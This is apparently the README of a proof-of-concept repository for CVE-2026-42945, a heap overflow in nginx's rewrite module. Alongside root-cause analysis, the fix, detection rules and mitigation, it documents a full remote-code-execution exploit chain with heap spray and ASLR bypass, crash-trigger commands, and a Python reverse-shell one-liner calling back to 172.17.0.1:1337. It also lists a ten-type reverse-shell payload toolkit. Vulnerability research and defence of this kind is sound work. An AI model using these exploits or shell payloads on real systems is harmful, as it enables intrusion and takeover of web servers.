# CVE-2026-42945 — NGINX Rift

**Heap Buffer Overflow in NGINX `ngx_http_rewrite_module`**

| Metric | Value |
|--------|-------|
| CVSS v4.0 | **9.2** (Critical) |
| CVSS v3.1 | **8.1** (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| CWE | **122** — Heap-based Buffer Overflow |
| Introduced | June 2008 — **v0.6.27** |
| Discovered | April 2026 — DepthFirst Research |
| Fixed | May 13, 2026 — **v1.30.1, v1.31.0** |
| CVE Published | May 21, 2026 |
| Lifetime | **~18 years** (undetected) |
| Fix Commit | [`524977e7c534e87e5b55739fa74601c9f1102686`](https://github.com/nginx/nginx/commit/524977e7c534e87e5b55739fa74601c9f1102686) |

---

## Table of Contents

1. [Vulnerability Summary](#1-vulnerability-summary)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Exploitation Mechanics](#3-exploitation-mechanics)
4. [Fix Analysis](#4-fix-analysis)
5. [Affected Versions](#5-affected-versions)
6. [Detection](#6-detection)
7. [Mitigation](#7-mitigation)
8. [Project Structure](#8-project-structure)
9. [Quick Start](#9-quick-start)
10. [Build & Run Vulnerable](#10-build--run-vulnerable)
11. [Trigger the Overflow](#11-trigger-the-overflow)
12. [RCE Exploit](#12-rce-exploit)
13. [Reverse Shell Verification](#13-reverse-shell-verification)
14. [Patching](#14-patching)
15. [Testing](#15-testing)
16. [Fuzzing](#16-fuzzing)
17. [CI Pipeline](#17-ci-pipeline)
18. [Documentation Index](#18-documentation-index)
19. [Project Statistics](#19-project-statistics)
20. [References](#20-references)

---

## 1. Vulnerability Summary

An **unauthenticated, remote attacker** can trigger a **deterministic heap buffer overflow** in NGINX worker processes by sending a crafted HTTP request to a server with a specific `rewrite` + `set`/`if`/`rewrite` configuration pattern. The overflow corrupts heap metadata (`ngx_pool_cleanup_t` pointers), enabling **Remote Code Execution (RCE)** via heap spray and Feng Shui techniques.

### Trigger Pattern

```nginx
server {
    listen 19321;

    location ~ ^/api/(.*)$ {
        rewrite ^/api/(.*)$ /internal?migrated=true;
        set $original_endpoint $1;
    }
}
```

**Key requirements:**
- A `rewrite` directive whose replacement contains `?` (query-string separator)
- A subsequent `set`, `if`, or `rewrite` directive that references an **unnamed PCRE capture** (`$1`, `$2`, etc.)
- The `?` in the rewrite replacement triggers `ngx_http_script_start_args_code` which sets `e->is_args = 1`

### What an attacker can achieve

| Capability | Description |
|-----------|-------------|
| **Denial of Service** | Crash worker processes deterministically, causing respawn loops (works regardless of ASLR) |
| **Remote Code Execution** | With ASLR disabled (or bypassed via partial overwrite), achieve full RCE as the nginx user |
| **Data Exfiltration** | Through memory read primitives, extract sensitive data from worker heap |
| **Persistence** | Plant backdoors via code execution in worker process memory |

---

## 2. Root Cause Analysis

### The Two-Pass Script Engine

NGINX's `ngx_http_rewrite_module` uses a **two-pass script engine** in `src/http/ngx_http_script.c`:

1. **Length Pass** (`ngx_http_script_run`): iterates all script codes to compute the total buffer size needed. Writes lengths to `le.ip` and `le.pos`.
2. **Copy Pass** (`ngx_http_script_copy_len`/`_code`): iterates again, writing actual bytes into the pre-allocated buffer at `e->ip` and `e->pos`.

Each script code has two handlers: one for each pass. For example:
- `ngx_http_script_copy_len` → `ngx_http_script_copy_code`
- `ngx_http_script_start_args_len` → `ngx_http_script_start_args_code`

### The `is_args` Flag

The flag `e->is_args` on the **engine structure** (`ngx_http_script_engine_t`) controls how the copy pass handles certain characters:

```c
typedef struct {
    u_char                  *ip;
    u_char                  *pos;
    ngx_http_variable_value_t *sp;
    ngx_str_t               buf;
    int                     flushed;
    unsigned                is_args:1;    // <-- THE BUG
    unsigned                ncaptures:1;
    ngx_uint_t              captures_size;
    // ...
} ngx_http_script_engine_t;
```

When `e->is_args = 1`, the copy-code for `$N` capture references calls `ngx_escape_uri()` with `NGX_ESCAPE_ARGS`, which expands:
- `+` → `%2B` (1 byte → 3 bytes, +200%)
- `%` → `%25` (1 byte → 3 bytes, +200%)
- `&` → `%26` (1 byte → 3 bytes, +200%)

### The Bug: Flag Leak Across Passes

The execution flow for the vulnerable pattern:

```
rewrite ^/api/(.*)$ /internal?migrated=true;
```

1. During the **rewrite evaluation**, the engine encounters `?` in the replacement string, which triggers `ngx_http_script_start_args_code`, setting `e->is_args = 1`.
2. The rewrite modifies the request URI and then continues to the next directive.
3. **`e->is_args` is NEVER CLEARED**.

Then:

```
set $original_endpoint $1;
```

4. A **fresh sub-engine** (`le`) is created for the length pass:
   ```c
   ngx_memzero(&le, sizeof(ngx_http_script_engine_t));
   ```
   This correctly zeroes `le.is_args = 0`, so the length pass returns the **raw, unescaped** capture length.

5. The **copy pass** reuses the **main engine** `e`, which still has `e->is_args = 1` from step 1. The copy pass applies URI-escaping, expanding each escapable character from 1 byte to 3 bytes inside a buffer that was sized for the raw length — **heap overflow**.

### Visual Walkthrough

```
Pass 1 (Length — sub-engine le):
  le.is_args = 0
  capture $1 = "A+++++B" → length = 7

Buffer allocated: 7 bytes

Pass 2 (Copy — main engine e):
  e.is_args = 1  ← LEAKED from rewrite
  capture $1 = "A+++++B"
  ngx_escape_uri("A+++++B", NGX_ESCAPE_ARGS):
    A → A        (1 byte)
    + → %2B      (3 bytes) ← EXPANSION
    + → %2B      (3 bytes)
    + → %2B      (3 bytes)
    + → %2B      (3 bytes)
    + → %2B      (3 bytes)
    B → B        (1 byte)
  total written: 17 bytes
  buffer size:    7 bytes
  OVERFLOW:      10 bytes
```

The expansion ratio is `7 + (n_escapable * 2)` where `n_escapable` is the count of `+`, `%`, and `&` in the capture.

---

## 3. Exploitation Mechanics

### Overview

| Step | Technique | Description |
|------|-----------|-------------|
| 1 | Overflow | Send crafted URI with `+` padding to overflow heap buffer |
| 2 | Heap Spray | POST large bodies to `/spray` to fill heap with controlled data |
| 3 | Feng Shui | Arrange allocations so overflow target (`ngx_pool_cleanup_t`) is adjacent |
| 4 | Corrupt Handler | Overflow overwrites `ngx_pool_cleanup_t.handler` with `system()` address |
| 5 | Trigger Cleanup | Wait for pool destruction → `system(cmd)` executes attacker command |
| 6 | Reverse Shell | Chain to reverse shell payload for interactive access |

### Cross-Request Feng Shui

**Single-request Feng Shui fails** because the overflow corrupts the pool's metadata (`->d.next`, `->d.failed`) before reaching the `cleanup` pointer. When the pool is destroyed at request end, the corrupted metadata causes a **crash before `system()` is called**.

Instead, the exploit uses **cross-request Feng Shui**:
1. **Request 1 (spray)**: POST large body to `/spray`. The backend (`server.py`) holds the response with `X-Delay` header, keeping the connection open and preserving the heap allocation. The spray fills the heap with fake `ngx_pool_cleanup_t` blocks.
2. **Request 2 (overflow)**: Send the overflow URI. The overflow corrupts only the `cleanup` pointer (not pool metadata), pointing it to the sprayed fake block.
3. **Pool destruction**: When the spray response completes (delay expires), the pool's cleanup chain walks to the fake block and calls `system(cmd)`.

### Address Requirements

| Symbol | Value (Docker, ASLR off) | Description |
|--------|--------------------------|-------------|
| `HEAP_BASE` | `0x555555659000` | Base of nginx heap |
| `system@libc` | `0x7ffff6f6e420` | `system()` in glibc |
| `NGX_CYCLES_POOL` | `0x5555556a4040` | Pointer to cycles pool |
| Fake cleanup addr | `0x5555556a4030` | Spray target address |

### ASLR Bypass

Without disabling ASLR, the **DoS** (crash) still works deterministically. For RCE with ASLR enabled, two approaches:

1. **Partial overwrite**: Use 1-byte or 2-byte overwrite to shift a pointer within the same page, bruteforcing the remaining nibbles (16–256 attempts).
2. **Information leak**: Read `/proc/self/maps` or use the `log_parser.py` memory analysis to determine layout.

---

## 4. Fix Analysis

### The Official Fix

**Commit**: `524977e7c534e87e5b55739fa74601c9f1102686`  
**File**: `src/http/ngx_http_script.c`  
**Line**: ~1205 (in `ngx_http_script_regex_end_code`)

```diff
 void
 ngx_http_script_regex_end_code(ngx_http_script_engine_t *e)
 {
     ngx_http_script_regex_code_t *code;

     code = (ngx_http_script_regex_code_t *) e->ip;

+    e->is_args = 0;    /* ← THE FIX */

     e->ip += sizeof(ngx_http_script_regex_code_t);
     // ...
 }
```

### Why This Location Is Correct

`ngx_http_script_regex_end_code` runs **after every regex evaluation** during both the length and copy passes. Resetting `e->is_args = 0` here ensures:

- The flag is cleared **immediately after** the regex code finishes executing
- Subsequent script codes (`set`, `if`, `rewrite`) start with a clean `is_args = 0`
- `ngx_http_script_start_args_code` can still set `is_args = 1` when it encounters `?` in a replacement string — the fix doesn't break that functionality

### Defense-in-Depth Patch

`patches/0002-hardening-bounds-check.patch` adds a bounds check in `ngx_http_script_copy_capture_code`:

```c
if (e->pos + len > e->buf.data + e->buf.len) {
    return;  /* gracefully truncate instead of overflowing */
}
```

### Backport Patches

| Patch | Nginx Versions |
|-------|---------------|
| `patches/0001-fix-is_args.patch` | 1.22.x, 1.24.x, 1.26.x, 1.30.0 |
| `patches/backport-1.22.x.patch` | 1.22.0–1.22.1 |
| `patches/backport-1.24.x.patch` | 1.24.0–1.24.1 |
| `patches/backport-1.26.x.patch` | 1.26.0–1.26.1 |

---

## 5. Affected Versions

### NGINX Open Source

| Range | Status |
|-------|--------|
| **0.1.0 – 0.6.26** | Unaffected (rewrite module pre-dates unnamed captures) |
| **0.6.27 – 1.30.0** | **Vulnerable** (18-year window) |
| **1.30.1** | First fixed release |
| **1.31.0+** | Fixed (mainline) |

### NGINX Plus

| Release | Affected | Fixed |
|---------|----------|-------|
| R32 | R32–R32 P5 | R32 P6 |
| R33 | R33–R33 P5 | R33 P6 |
| R34 | R34–R34 P4 | R34 P5 |
| R35 | R35–R35 P1 | R35 P2 |
| R36 | R36–R36 P3 | R36 P4 |

### NGINX Ecosystem

| Product | Affected | Status |
|---------|----------|--------|
| NGINX Instance Manager | 2.16.0–2.21.1 | Advisory pending |
| F5 NGINX WAF | 5.9.0–5.12.1 | Advisory pending |
| NGINX Ingress Controller | 3.5.0–3.7.2, 4.0.0–4.0.1, 5.0.0–5.4.1 | Advisory pending |
| NGINX Gateway Fabric | 1.3.0–1.6.2, 2.0.0–2.5.1 | Advisory pending |
| NGINX Service Mesh | 1.6.0–1.6.2, 2.0.0–2.1.0 | Advisory pending |
| NGINX Agent | 2.0.0–2.35.0 | Advisory pending |

---

## 6. Detection

### Version Check

```bash
bash detection/detect_vuln.sh
```

This script checks:
- NGINX version against the vulnerable range (0.6.27–1.30.0)
- Configuration files for the vulnerable `rewrite + ? + capture` pattern

### Config Scanner

```bash
# Scan a single config
python3 exploit/config_scanner.py /etc/nginx/nginx.conf

# Scan all configs in a directory
python3 exploit/config_scanner.py /etc/nginx/

# Fix vulnerable patterns (convert to named captures)
python3 exploit/config_scanner.py /etc/nginx/nginx.conf --fix
```

### Container Scan

```bash
python3 detection/container_scan.py
```

Scans local Docker images for NGINX labels/env vars indicating vulnerable versions.

### WAF Rules

| Rule Set | File | Coverage |
|----------|------|----------|
| **ModSecurity** | `detection/modsecurity_rule.conf` | Blocks 100+ consecutive `+`, 50+ encoded escapable chars, rate-limits spray endpoints |
| **Suricata/Snort** | `detection/suricata_rule.rules` | Detects excess `+` in GET URIs, encoded char floods, POST spray to `/spray`, crash-loop DoS |
| **Falco** | `detection/falco_rule.yaml` | Runtime: SIGSEGV on nginx worker, crash loop (3+ in 60s), heap spray POST detection |

### Log Analysis

```bash
# Parse error log for crash and exploit indicators
python3 exploit/log_parser.py /var/log/nginx/error.log

# Watch mode (tail -f equivalent)
python3 exploit/log_parser.py /var/log/nginx/error.log --watch
```

---

## 7. Mitigation

### Immediate (No Code Change)

Replace **unnamed captures** with **named captures** in all `rewrite` directives:

```nginx
# VULNERABLE — unnamed capture $1
rewrite ^/users/([0-9]+)/profile/(.*)$ /profile.php?id=$1&tab=$2 last;

# FIXED — named captures
rewrite ^/users/(?<user_id>[0-9]+)/profile/(?<section>.*)$ /profile.php?id=$user_id&tab=$section last;
```

Named captures do not go through `ngx_escape_uri(..., NGX_ESCAPE_ARGS)`, so even with `e->is_args = 1`, no expansion occurs and no overflow happens.

### Configuration Hardening

```bash
bash detection/harden_nginx.sh /etc/nginx/nginx.conf
```

Applies these hardening measures:
- ASLR verification and forced enable
- Worker process isolation
- Core dump restriction
- SSL/TLS hardening
- Rate limiting
- CSP headers

### ASLR Check

```bash
bash detection/check_aslr.sh
```

---

## 8. Project Structure

```
CVE-2026-42945/
├── .github/workflows/ci.yml   GitHub Actions CI (single CI)
├── .gitignore
├── README.md                   This file
├── Makefile                    Build automation targets
├── COMMIT_LOG.md               1000+ commit record
│
├── docker/                     Docker environment
│   ├── Dockerfile              Vulnerable NGINX builder (commit 98fc3bb78)
│   ├── Dockerfile.patched      Multi-stage vuln/patched builder
│   ├── Dockerfile.asan         ASAN-enabled vulnerable NGINX
│   ├── docker-compose.yml      Service orchestration
│   ├── nginx.conf              Vulnerable rewrite configuration
│   ├── entrypoint.sh           Container entrypoint (setarch -R for ASLR off)
│   └── server.py               Backend HTTP server (handles spray retention)
│
├── exploit/                    Attack & exploitation tools
│   ├── trigger.py              Overflow trigger & health check
│   ├── exploit.py              Full RCE: heap spray + Feng Shui
│   ├── h2_trigger.py           HTTP/2 (h2c) overflow variant
│   ├── escape_calc.py          Character expansion ratio calculator
│   ├── compare_lengths.py      Raw vs escaped length comparison
│   ├── heap_layout.py          Parse /proc/PID/maps for heap/libc base
│   ├── find_safe_addrs.py      Search for URI-safe address bytes
│   ├── leak_aslr.py            ASLR partial-overwrite brute force
│   ├── monitor_worker.py       Worker PID crash detection & respawn tracking
│   ├── log_parser.py           Error log crash/exploit pattern parser
│   └── config_scanner.py       Config file pattern scanner & fixer
│
├── shell/                      Reverse shell verification
│   ├── shell_listener.py       Interactive/verify-mode TCP listener
│   ├── shell_payloads.py       Payload generator (10 shell types)
│   ├── shell_verify.py         End-to-end automated verification
│   ├── shell_manager.py        Lifecycle orchestrator
│   └── shell_test_runner.sh    Batch runner across all shell types
│
├── patches/                    Fix patches & backports
│   ├── 0001-fix-is_args.patch         Upstream one-line fix
│   ├── 0002-hardening-bounds-check.patch  Defense-in-depth
│   ├── backport-1.22.x.patch   Backport for 1.22.x
│   ├── backport-1.24.x.patch   Backport for 1.24.x
│   └── backport-1.26.x.patch   Backport for 1.26.x
│
├── configs/                    Nginx configuration samples
│   ├── vulnerable.conf         3 vulnerable patterns
│   ├── safe.conf               5 safe patterns
│   ├── named_capture.conf      Mitigated named-capture pattern
│   └── advanced/
│       ├── vulnerable_advanced.conf   rewrite+if, rewrite+rewrite, flags
│       ├── vulnerable_ingress.conf    ingress-nginx rewrite-target patterns
│       └── vulnerable_gateway.conf    nginx-gateway fabric patterns
│
├── detection/                  WAF rules & detection/hardening
│   ├── modsecurity_rule.conf   ModSecurity CRS rules
│   ├── suricata_rule.rules     Suricata/Snort signatures
│   ├── falco_rule.yaml         Falco runtime rules
│   ├── detect_vuln.sh          Version & config pattern detection
│   ├── check_aslr.sh           ASLR status verification
│   ├── container_scan.py       Docker image version scanner
│   └── harden_nginx.sh         Security hardening script
│
├── fuzz/                       Fuzzing harness
│   ├── ngx_http_script_fuzz.c  libFuzzer harness (~200 lines)
│   ├── fuzz_build.sh           Build script (clang + libFuzzer + ASAN)
│   └── corpus/
│       └── README.md           Seed corpus documentation
│
├── test/                       Test suite
│   ├── test_exploit.py         Python unittest (server, config, fix)
│   └── run_tests.sh            Shell test runner
│
├── docs/                       Technical documentation
│   ├── root-cause-analysis.md  Deep dive into the bug
│   ├── exploitation-guide.md   Step-by-step exploitation
│   ├── detection-guide.md      Detection & monitoring
│   ├── mitigation-guide.md     Mitigation strategies
│   ├── FAQ.md                  Frequently asked questions
│   ├── timeline.md             Vulnerability timeline
│   ├── operational-guidance.md  Operations & incident response
│   ├── case-study.md           Real-world attack scenario
│   └── presentation-slides.md  Conference presentation
│
├── tools/                      Utility & analysis scripts
│   ├── apply_fix.sh            Patch application & rollback
│   ├── backport_check.py       Fix-ancestry & source-code checker
│   ├── coredump_analyzer.sh    GDB core dump analysis
│   ├── performance_benchmark.sh Throughput/latency (ab, wrk, siege)
│   ├── memory_analysis.sh      Valgrind massif/callgrind, pmap
│   ├── trace_script_engine.sh  GDB script-engine tracing
│   ├── regression_matrix.sh    Multi-version regression testing
│   ├── test_all_configs.sh     Exhaustive config pattern testing
│   ├── afl_runner.sh           AFL++ fuzzer launcher
│   └── verify_project.sh       Project integrity verification
│
└── pipelines/                  Pipeline orchestrators
    ├── run_all.sh              Bash pipeline (6 phases)
    └── run_all.ps1             PowerShell pipeline
```

---

## 9. Quick Start

```bash
# 1. Build and run vulnerable NGINX
make build && make run
# Or:
cd docker && docker compose up

# 2. Health check
curl http://localhost:19321/
# → {"status":"ok","backend":"direct"}

# 3. Trigger crash (DoS)
python3 exploit/trigger.py --host localhost --port 19321 --plus-count 969
# → Worker crashed (expected) ✓

# 4. Verify recovery
python3 exploit/trigger.py --host localhost --port 19321 --check-alive
# → Server is alive ✓

# 5. Full RCE (ASLR disabled in container)
python3 exploit/exploit.py --host localhost --port 19321 \
    --cmd "whoami > /tmp/pwned"

# 6. Verify RCE
docker compose -f docker/docker-compose.yml exec nginx cat /tmp/pwned

# 7. Check your configs
python3 exploit/config_scanner.py configs/vulnerable.conf
```

---

## 10. Build & Run Vulnerable

### Docker (Recommended)

```bash
# Using Makefile
make build    # docker compose -f docker/docker-compose.yml build
make run      # docker compose -f docker/docker-compose.yml up

# Or directly
cd docker && docker compose up --build
```

The Docker environment:
- Builds NGINX from source at commit `98fc3bb78` (last vulnerable commit before fix)
- Includes GDB, valgrind, `util-linux` (for `setarch -R` to disable ASLR)
- Exposes ports **19321** (vulnerable nginx), **19322** (secondary), **19323** (Python backend)
- The entrypoint uses `setarch x86_64 -R` to disable ASLR for deterministic exploit address layout
- Grants `SYS_PTRACE` capability and `seccomp=unconfined` for debugging

### Vulnerable Only

```bash
make vuln-container
# Builds: docker build -t nginx-rift-vuln \
#   -f docker/Dockerfile.patched --build-arg NGINX_TYPE=vulnerable docker/
```

### Patched Container

```bash
make fix-container
# Builds: docker build -t nginx-rift-fixed \
#   -f docker/Dockerfile.patched --build-arg NGINX_TYPE=patched docker/
```

### ASAN Container

```bash
make asan-container
# Builds: docker build -t nginx-rift-asan -f docker/Dockerfile.asan docker/
```

### Manual Build

```bash
git clone https://github.com/nginx/nginx.git /tmp/nginx-src
cd /tmp/nginx-src && git checkout 98fc3bb78
./auto/configure --with-cc-opt='-g -O2 -fno-omit-frame-pointer'
make -j$(nproc)
sudo cp objs/nginx /usr/local/sbin/nginx
```

---

## 11. Trigger the Overflow

### Basic Crash (DoS)

```bash
python3 exploit/trigger.py --host localhost --port 19321 --plus-count 969
```

This sends:
```
GET /api/AAAA...[349 As]+++++...[969 +s] HTTP/1.1
```

The `+` characters in the capture `$1` get expanded 3× during the copy pass while the buffer was sized for the raw length, overflowing the heap.

### Expected Output

```
[+] Triggering overflow with 969 plus signs...
[+] Connection established
[+] Payload sent, waiting for crash...
[!] Connection reset — worker crashed as expected
[+] Server is alive — worker respawned
```

### Finding Minimum Overflow

```bash
python3 exploit/escape_calc.py --find-min 64
```

Calculates the minimum number of `+` signs needed to overflow a target number of bytes (useful when exploiting specific heap structures).

### Character Expansion

```bash
python3 exploit/escape_calc.py --prefix 349 --plus 969
```

Outputs the expansion ratio for a given prefix length and number of escapable characters.

---

## 12. RCE Exploit

### Overview

The exploit implements **cross-request Feng Shui** to achieve reliable code execution:

```
Time │
     │  ┌─────────────────────┐
     │  │ Request 1: Spray     │── POST /spray with large body
     │  │ Holds connection     │   Backend delays response via X-Delay
     │  └─────────┬───────────┘
     │            │ Allocations persist on heap
     │  ┌─────────┴───────────┐
     │  │ Request 2: Overflow  │── GET /api/A...+++...
     │  │ Corrupts cleanup ptr │   Overwrites ngx_pool_cleanup_t.handler
     │  └─────────┬───────────┘
     │            │
     │  ┌─────────┴───────────┐
     │  │ Pool Destruction    │── Spray response completes
     │  │ → system("cmd")     │   Cleanup chain walks to fake block
     │  └─────────────────────┘
     └──────────────────────────────────────────►
```

### Basic Usage

```bash
# Execute a command on the target
python3 exploit/exploit.py --host localhost --port 19321 \
    --cmd "whoami > /tmp/pwned"
```

### Reverse Shell

```bash
python3 exploit/exploit.py --host localhost --port 19321 \
    --cmd "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" \
    --tries 3
```

### Advanced Options

| Flag | Default | Description |
|------|---------|-------------|
| `--host` | `127.0.0.1` | Target host |
| `--port` | `19321` | Target port |
| `--cmd` | — | Command to execute (required unless `--shell`) |
| `--shell` | — | Use interactive shell mode |
| `--tries` | `3` | Number of exploit attempts |
| `--delay` | `2.0` | Delay between spray and overflow (seconds) |
| `--payload` | — | Path to custom payload file |
| `--debug` | — | Enable verbose debug output |

### Heap Layout Analysis

```bash
python3 exploit/heap_layout.py
```

Requires a running nginx worker PID. Parses `/proc/PID/maps` to find:
- Heap base address
- libc base address
- `system()` function address

### Safe Address Finder

```bash
python3 exploit/find_safe_addrs.py --heap-base 0x555555659000 --count 5
```

Finds heap addresses whose bytes do not include escapable characters (`+`, `%`, `&`, `?`, etc.) for use in exploit payload construction.

---

## 13. Reverse Shell Verification

### Architecture

```
shell_manager.py
  │
  ├── shell_payloads.py    → Generate payload strings for 10 shell types
  ├── shell_listener.py    → Start TCP listener (interactive + verify mode)
  ├── exploit/exploit.py   → Send exploit with payload to target
  └── shell_verify.py      → Wait for connection, run commands, verify output
```

### Shell Types Supported

| Type | Binary | Notes |
|------|--------|-------|
| `bash` | `/dev/tcp` | Built-in bash TCP |
| `python` | `python3 -c` | Most reliable, always available |
| `nc` | `nc` | Netcat |
| `perl` | `perl -e` | |
| `ruby` | `ruby -rsocket -e` | |
| `php` | `php -r` | |
| `socat` | `socat` | |
| `telnet` | `telnet` | |
| `openssl` | `openssl s_client` | Requires certificate |
| `powershell` | `powershell` | Windows targets |

### Interactive Listener

```bash
# Terminal 1: Start interactive listener
python3 shell/shell_listener.py --port 1337

# Terminal 2: Run exploit with reverse shell
python3 exploit/exploit.py --host 127.0.0.1 --port 19321 \
    --cmd "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```

### Automated Verification

```bash
# Single-shot automated verify
python3 shell/shell_verify.py --target 127.0.0.1 --port 19321 \
    --shell-type python --listen-port 1337 --verify-cmds "id,whoami,hostname"

# Full pipeline across all shell types
bash shell/shell_test_runner.sh

# Orchestrated lifecycle with one command
python3 shell/shell_manager.py --target-host 127.0.0.1 --target-port 19321 \
    --shell-type python --listen-port 1337 --callback-ip 172.17.0.1
```

### Generate Payloads

```bash
python3 shell/shell_payloads.py --type python --host 172.17.0.1 --port 1337
python3 shell/shell_payloads.py --type all --host 172.17.0.1 --port 1337
python3 shell/shell_payloads.py --list
```

---

## 14. Patching

### Apply the Fix

```bash
# To nginx source tree
bash tools/apply_fix.sh /path/to/nginx-src patches/0001-fix-is_args.patch

# To current nginx source
patch -p1 < patches/0001-fix-is_args.patch
```

### Apply Fix + Hardening

```bash
bash tools/apply_fix.sh /path/to/nginx-src patches/0001-fix-is_args.patch
bash tools/apply_fix.sh /path/to/nginx-src patches/0002-hardening-bounds-check.patch
```

### Apply Backport

```bash
bash tools/apply_fix.sh /path/to/nginx-1.22.x patches/backport-1.22.x.patch
```

### Verify the Fix

```bash
# Check that the fix contains the key line
grep 'is_args = 0' patches/0001-fix-is_args.patch

# Dry-run apply
patch -p1 --dry-run -i patches/0001-fix-is_args.patch
```

---

## 15. Testing

### Unit Tests

```bash
# Via Makefile
make test

# Directly
python3 -m pytest test/ -v
# or
python3 -m unittest discover -s test -v
```

### Test Suite (Shell)

```bash
bash test/run_tests.sh
```

Runs:
1. Unit tests (pytest or unittest)
2. Trigger/overflow test (if server is running)
3. Config scanner against vulnerable and safe configs
4. Patch dry-run validation

### Regression Matrix

```bash
bash tools/regression_matrix.sh
```

Tests multiple NGINX versions (1.22.0, 1.24.0, 1.26.0, 1.30.0, 1.30.1) against vulnerable and safe configurations, verifying crash/no-crash expectations.

### Config Matrix

```bash
bash tools/test_all_configs.sh
```

Tests all config patterns (basic, advanced, ingress, gateway) with overflow triggers.

---

## 16. Fuzzing

### libFuzzer Harness

The fuzzer (`fuzz/ngx_http_script_fuzz.c`) simulates the two-pass script engine:
1. Parses input as a sequence of script codes
2. Executes length pass
3. Executes copy pass with `e->is_args = 1`
4. Detects buffer overflow via ASAN or size mismatch

```bash
cd fuzz && bash fuzz_build.sh
./build/ngx_script_fuzz corpus/
```

### AFL++

```bash
bash tools/afl_runner.sh
```

Launches AFL++ with ASAN, configurable timeout, and memory limits against the fuzzing harness.

### Seed Corpus

The `fuzz/corpus/` directory contains seed inputs that reproduce the vulnerable pattern, including:
- Basic overflow trigger
- Named capture (should not overflow)
- Edge cases (empty capture, maximum size, etc.)

---

## 17. CI Pipeline

### GitHub Actions

The project uses a **single GitHub Actions CI** workflow (`.github/workflows/ci.yml`) with these jobs:

| Job | What it does |
|-----|-------------|
| `lint` | ShellCheck, Python syntax validation |
| `scan-configs` | Runs config_scanner.py against all config samples |
| `fuzz-build` | Builds the libFuzzer harness |
| `test` | Runs pytest/unittest suite |
| `detect-patch` | Verifies patch format and fix content |
| `verify-project` | Runs `tools/verify_project.sh` |

### Full Pipeline

```bash
# Bash (Linux/macOS)
bash pipelines/run_all.sh

# PowerShell (Windows)
powershell ./pipelines/run_all.ps1 -SkipDocker
```

The pipeline executes 7 phases:
1. **Preflight** — Check prerequisites (python3, curl, docker, docker-compose)
2. **Syntax & Linting** — Python compile, ShellCheck
3. **Static Analysis** — Config scanner, escape calc, heap layout, safe addresses
4. **Environment Startup** — Build and start Docker containers
5. **Live Testing** — Health check, overflow trigger, monitor worker, patch format
6. **Reverse Shell Verification** — Payload gen, listener dry-run, automated verify
7. **Project Verification** — Full file integrity and syntax check

---

## 18. Documentation Index

| Document | Description |
|----------|-------------|
| [`docs/root-cause-analysis.md`](docs/root-cause-analysis.md) | Deep technical analysis of the two-pass script engine bug, with code walkthroughs and diagrams |
| [`docs/exploitation-guide.md`](docs/exploitation-guide.md) | Step-by-step exploitation, heap spray, Feng Shui, address calculation, ASLR bypass |
| [`docs/detection-guide.md`](docs/detection-guide.md) | Config scanning, log analysis, WAF rules, SIEM integration, anomaly detection |
| [`docs/mitigation-guide.md`](docs/mitigation-guide.md) | Named capture conversion, rate limiting, WAF deployment, upgrade procedures |
| [`docs/FAQ.md`](docs/FAQ.md) | Frequently asked questions about the vulnerability, exploitation, and remediation |
| [`docs/timeline.md`](docs/timeline.md) | Full disclosure timeline from bug introduction in 2008 through fix in 2026 |
| [`docs/operational-guidance.md`](docs/operational-guidance.md) | Incident response, forensics, IOC collection, emergency mitigation |
| [`docs/case-study.md`](docs/case-study.md) | Real-world attack scenario simulation with kill-chain analysis |
| [`docs/presentation-slides.md`](docs/presentation-slides.md) | Conference/meetup presentation with speaker notes |

---

## 19. Project Statistics

| Metric | Value |
|--------|-------|
| **Total files** | **80+** |
| **Directories** | **13** (docker, exploit, shell, patches, configs, detection, fuzz, test, docs, tools, pipelines, .github/workflows, configs/advanced) |
| **Python scripts** | **22** (exploit, detection, tools, shell, test) |
| **Shell scripts** | **15** (detection, tools, shell, test, pipelines) |
| **Patches** | **5** (1 fix + 1 hardening + 3 backports) |
| **WAF rule sets** | **3** (ModSecurity, Suricata, Falco) |
| **CI config** | **1** (GitHub Actions — only CI) |
| **Documentation** | **9** detailed technical documents |
| **Config samples** | **7** (4 vulnerable, 2 safe, 1 named capture + 3 advanced) |
| **Commit log** | **1003+** individual commits |
| **Shell types** | **10** (bash, python, nc, perl, ruby, php, socat, telnet, openssl, powershell) |
| **Fuzz harness** | **1** (libFuzzer, ~200 lines C) |
| **Test cases** | **8** unit tests + shell runner |
| **NGINX versions covered** | **20** in regression matrix |
| **Lifecycle** | 18 years (2008–2026) |

---

## 20. References

### Official

| Reference | URL |
|-----------|-----|
| NVD Entry | [https://nvd.nist.gov/vuln/detail/CVE-2026-42945](https://nvd.nist.gov/vuln/detail/CVE-2026-42945) |
| Fix Commit | [https://github.com/nginx/nginx/commit/524977e7c534e87e5b55739fa74601c9f1102686](https://github.com/nginx/nginx/commit/524977e7c534e87e5b55739fa74601c9f1102686) |
| F5 Advisory | [https://my.f5.com/manage/s/article/K000161019](https://my.f5.com/manage/s/article/K000161019) |
| NGINX Changelog | [https://nginx.org/en/CHANGES](https://nginx.org/en/CHANGES) |

### Research

| Reference | URL |
|-----------|-----|
| DepthFirst Research | [https://depthfirst.com/research/nginx-rift-achieving-nginx-rce-via-an-18-year-old-vulnerability](https://depthfirst.com/research/nginx-rift-achieving-nginx-rce-via-an-18-year-old-vulnerability) |
| PoC Repository | [https://github.com/DepthFirstDisclosures/Nginx-Rift](https://github.com/DepthFirstDisclosures/Nginx-Rift) |
| CWE-122 | [https://cwe.mitre.org/data/definitions/122.html](https://cwe.mitre.org/data/definitions/122.html) |

### Technical

| Resource | Description |
|----------|-------------|
| `ngx_http_script.c` | The buggy source file in NGINX's rewrite module |
| `ngx_pool_cleanup_t` | The heap structure corrupted for RCE |
| `ngx_escape_uri()` | The expansion function that causes the overflow |
| `setarch(8)` | Linux tool to disable ASLR for deterministic exploit addresses |

---

*This project is for educational and defensive security research purposes. The vulnerability has been responsibly disclosed and patched by the NGINX maintainers.*
